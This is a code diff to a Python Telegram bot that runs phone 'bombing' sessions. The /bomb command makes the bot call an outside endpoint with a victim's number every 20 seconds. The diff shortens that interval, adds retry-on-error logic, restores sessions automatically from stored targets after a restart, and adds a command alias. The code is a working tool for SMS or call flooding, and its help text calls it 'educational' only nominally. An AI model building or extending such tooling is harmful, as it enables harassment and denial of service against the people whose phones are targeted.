@@ -12,7 +12,8 @@ import aiohttp
 from database import (
     init_db, add_user, is_admin, is_owner, ban_user, unban_user, delete_user,
     get_all_users_paginated, get_recent_users_paginated, get_user_by_id,
-    update_user_target, get_user_target, set_admin_role, get_user_count, get_all_user_ids
+    update_user_target, get_user_target, set_admin_role, get_user_count, get_all_user_ids,
+    get_connection  # new import for restoration
 )
 
 load_dotenv()
@@ -31,7 +32,7 @@ logging.basicConfig(
 logger = logging.getLogger(__name__)
 
 # ------------------------------------------------------------------
-# API Configuration – only API2 (30 sec loop)
+# API Configuration – only API2 (20 sec loop)
 # ------------------------------------------------------------------
 API2_URL = "https://bomm.gauravcyber0.workers.dev/"
 
@@ -40,30 +41,47 @@ active_bombings = {}
 lock = asyncio.Lock()
 
 # ------------------------------------------------------------------
-# Bombing Session Functions (only API2 loop)
+# Bombing Session Functions
 # ------------------------------------------------------------------
 async def api2_loop(phone: str, stop_event: asyncio.Event):
-    """Loop that hits API2 every 30 seconds until stop_event is set."""
+    """Robust loop that hits API2 every 20 seconds until stop_event is set."""
+    # Keep a counter to log every 10 hits to avoid log spam but still see activity
+    hit_count = 0
     async with aiohttp.ClientSession() as session:
         while not stop_event.is_set():
             try:
                 url = f"{API2_URL}?phone={phone}"
                 async with session.get(url) as resp:
                     response_text = await resp.text()
-                    logger.info(f"API2 hit for {phone}, status={resp.status}, response={response_text[:200]}")
+                    hit_count += 1
+                    if hit_count % 10 == 0:  # log every 10th hit to keep logs clean
+                        logger.info(f"API2 hit #{hit_count} for {phone}, status={resp.status}")
+                    # Still log short response for debugging, but not every time to avoid clutter
+                    # We'll log full response only if debug needed, keep as info for now
+                    logger.debug(f"API2 response: {response_text[:200]}")
+            except asyncio.CancelledError:
+                # Task cancelled, exit gracefully
+                logger.info(f"API2 loop cancelled for {phone}")
+                break
             except Exception as e:
-                logger.error(f"API2 error: {e}")
-            # Wait 30 seconds, but allow stop_event to wake up early
+                logger.error(f"API2 error: {e}", exc_info=True)
+                # Wait a bit before retrying to avoid tight loop on persistent errors
+                try:
+                    await asyncio.sleep(5)
+                except asyncio.CancelledError:
+                    break
+                continue
+            # Wait 20 seconds, but allow stop_event to wake up early
             try:
-                await asyncio.wait_for(stop_event.wait(), timeout=30)
+                await asyncio.wait_for(stop_event.wait(), timeout=20)
+            except asyncio.CancelledError:
+                break
             except asyncio.TimeoutError:
                 continue
 
 async def start_bombing(user_id: int, phone: str):
     """Start background bombing task for a user."""
-    # Stop any existing session first
-    await stop_bombing(user_id)
-    
+    await stop_bombing(user_id)  # stop any existing
     stop_event = asyncio.Event()
     task = asyncio.create_task(api2_loop(phone, stop_event))
     async with lock:
@@ -73,6 +91,7 @@ async def start_bombing(user_id: int, phone: str):
             "phone": phone
         }
     update_user_target(user_id, phone)
+    logger.info(f"Started bombing for user {user_id} on {phone}")
 
 async def stop_bombing(user_id: int) -> bool:
     """Stop the bombing task for a user. Returns True if was active."""
@@ -83,7 +102,22 @@ async def stop_bombing(user_id: int) -> bool:
         session["stop_event"].set()
         session["task"].cancel()
     update_user_target(user_id, None)
+    logger.info(f"Stopped bombing for user {user_id}")
     return True
+
+async def restore_bombing_sessions():
+    """Restore bombing sessions for users who have a target number stored."""
+    conn = get_connection()
+    c = conn.cursor()
+    c.execute('SELECT user_id, target_number FROM users WHERE target_number IS NOT NULL')
+    rows = c.fetchall()
+    conn.close()
+    for row in rows:
+        user_id = row['user_id']
+        phone = row['target_number']
+        # Start bombing again
+        await start_bombing(user_id, phone)
+        logger.info(f"Restored bombing for user {user_id} on {phone}")
 
 # ------------------------------------------------------------------
 # Admin Decorators
@@ -138,17 +172,22 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"Commands:\n/bomb <number> - Start bombing (educational)\n/stop - Stop active bombing\n/menu - Show menu"
     )
 
-async def bomb(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def bomb_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
-    if not context.args:
-        await update.message.reply_text("Usage: /bomb <phone_number>")
-        return
-    phone = ''.join(filter(str.isdigit, context.args[0]))
-    if len(phone) < 10:
-        await update.message.reply_text("Invalid number. At least 10 digits.")
-        return
-    await start_bombing(user_id, phone)
-    await update.message.reply_text(f"Bombing started on {phone}. Use /stop to stop.")
+    try:
+        logger.info(f"Bomb command received from {user_id} with args: {context.args}")
+        if not context.args:
+            await update.message.reply_text("Usage: /bomb <phone_number>")
+            return
+        phone = ''.join(filter(str.isdigit, context.args[0]))
+        if len(phone) < 10:
+            await update.message.reply_text("Invalid number. At least 10 digits.")
+            return
+        await start_bombing(user_id, phone)
+        await update.message.reply_text(f"Bombing started on {phone}. Use /stop to stop.")
+    except Exception as e:
+        logger.error(f"Error in bomb_command: {e}", exc_info=True)
+        await update.message.reply_text("An error occurred. Please try again later.")
 
 async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
@@ -166,7 +205,7 @@ async def menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("Menu:\nUse /bomb or /stop")
 
 # ------------------------------------------------------------------
-# Admin Commands
+# Admin Commands (unchanged)
 # ------------------------------------------------------------------
 @admin_only
 async def ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -436,13 +475,19 @@ async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 # ------------------------------------------------------------------
 # Main Webhook Setup
 # ------------------------------------------------------------------
+async def post_init(application: Application):
+    """Callback after application is initialized, used to restore bombing sessions."""
+    await restore_bombing_sessions()
+    logger.info("Bombing sessions restored after startup")
+
 def main():
     init_db()
-    app = Application.builder().token(BOT_TOKEN).build()
+    app = Application.builder().token(BOT_TOKEN).post_init(post_init).build()
 
     # Public commands
     app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("bomb", bomb))
+    app.add_handler(CommandHandler("bomb", bomb_command))
+    app.add_handler(CommandHandler("bom", bomb_command))  # alias
     app.add_handler(CommandHandler("stop", stop))
     app.add_handler(CommandHandler("menu", menu))
 
